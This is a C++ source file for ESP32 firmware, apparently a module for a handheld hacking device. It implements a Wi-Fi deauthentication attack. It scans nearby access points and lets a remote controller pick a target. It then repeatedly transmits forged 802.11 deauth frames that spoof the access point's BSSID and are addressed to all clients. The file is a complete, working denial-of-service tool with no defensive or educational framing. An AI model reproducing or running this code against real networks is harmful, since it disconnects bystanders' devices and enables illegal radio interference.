#include "ep_app_deauth.hpp"
#include "pp_commands.hpp"
#include "esp_log.h"
#include <cstdlib>

static const char* TAG = "deauth";

EPAppDeauth* EPAppDeauth::instance = nullptr;
deauth_ap_t EPAppDeauth::aps[EP_DEAUTH_MAX_APS] = {};
volatile uint16_t EPAppDeauth::apCount = 0;
volatile bool EPAppDeauth::scanning = false;
volatile bool EPAppDeauth::attacking = false;
volatile uint16_t EPAppDeauth::deauthSent = 0;

EPAppDeauth::EPAppDeauth() {
    instance = this;
    apCount = 0;
    attacking = false;
    ESP_LOGI(TAG, "Deauth app created");
}

EPAppDeauth::~EPAppDeauth() {
    attacking = false;
    esp_wifi_scan_stop();
    instance = nullptr;
}

void EPAppDeauth::performScan() {
    scanning = true;
    wifi_scan_config_t cfg = {};
    cfg.show_hidden = true;
    cfg.scan_type = WIFI_SCAN_TYPE_ACTIVE;
    cfg.scan_time.active.min = 60;
    cfg.scan_time.active.max = 120;
    if (esp_wifi_scan_start(&cfg, true) != ESP_OK) {
        scanning = false;
        return;
    }
    uint16_t n = EP_DEAUTH_MAX_APS;
    wifi_ap_record_t* recs = (wifi_ap_record_t*)malloc(sizeof(wifi_ap_record_t) * EP_DEAUTH_MAX_APS);
    if (recs == nullptr) {
        esp_wifi_clear_ap_list();
        scanning = false;
        return;
    }
    if (esp_wifi_scan_get_ap_records(&n, recs) != ESP_OK) n = 0;
    if (n > EP_DEAUTH_MAX_APS) n = EP_DEAUTH_MAX_APS;
    for (uint16_t i = 0; i < n; i++) {
        memcpy(aps[i].bssid, recs[i].bssid, 6);
        memcpy(aps[i].ssid, recs[i].ssid, 32);
        aps[i].ssid[31] = 0;
        aps[i].channel = recs[i].primary;
        aps[i].rssi = (int8_t)recs[i].rssi;
    }
    apCount = n;
    free(recs);
    scanning = false;
}

void EPAppDeauth::sendDeauth() {
    uint8_t frame[26] = {
        0xC0, 0x00,
        0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // to all clients
        0, 0, 0, 0, 0, 0,                    // from AP (spoofed)
        0, 0, 0, 0, 0, 0,
        0x00, 0x00,
        0x07, 0x00};
    memcpy(frame + 10, targetBssid, 6);
    memcpy(frame + 16, targetBssid, 6);
    for (int i = 0; i < 4; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
        deauthSent = deauthSent + 1;
    }
}

void EPAppDeauth::Loop(uint32_t currentMillis) {
    (void)currentMillis;
    if (attacking && haveTarget) {
        if (curChannel != targetChannel) {
            curChannel = targetChannel;
            esp_wifi_set_channel(curChannel, WIFI_SECOND_CHAN_NONE);
        }
        sendDeauth();
        return;
    }
    if (rescanReq) {
        rescanReq = false;
        performScan();
    }
}

// IRQ CALLBACK
bool EPAppDeauth::OnPPData(uint16_t command, std::vector<uint8_t>& data) {
    if (command == PPCMD_DEAUTH_GET_ENTRY) {
        if (data.size() >= 2) reqIdx = *reinterpret_cast<uint16_t*>(data.data());
        return true;
    } else if (command == PPCMD_DEAUTH_RESCAN) {
        if (!attacking) rescanReq = true;
        return true;
    } else if (command == PPCMD_DEAUTH_SET_TARGET) {
        if (data.size() >= 2) {
            uint16_t idx = *reinterpret_cast<uint16_t*>(data.data());
            if (idx < apCount) {
                memcpy(targetBssid, aps[idx].bssid, 6);
                targetChannel = aps[idx].channel;
                haveTarget = true;
            }
        }
        return true;
    } else if (command == PPCMD_DEAUTH_SET_ATTACK) {
        if (data.size() >= 1) attacking = (data[0] != 0) && haveTarget;
        return true;
    }
    return false;
}

// IRQ CALLBACK (reads fixed buffers only)
bool EPAppDeauth::OnPPReqData(uint16_t command, std::vector<uint8_t>& data) {
    if (command == PPCMD_APPMGR_APPCMD) {
        data.resize(8);
        uint16_t* p = reinterpret_cast<uint16_t*>(data.data());
        p[0] = apCount;
        p[1] = attacking ? 1 : 0;
        p[2] = scanning ? 1 : 0;
        p[3] = haveTarget ? targetChannel : 0;
        return true;
    } else if (command == PPCMD_DEAUTH_GET_ENTRY) {
        data.resize(sizeof(deauth_ap_t));
        memset(data.data(), 0, sizeof(deauth_ap_t));
        if (reqIdx < apCount) memcpy(data.data(), &aps[reqIdx], sizeof(deauth_ap_t));
        return true;
    }
    return false;
}
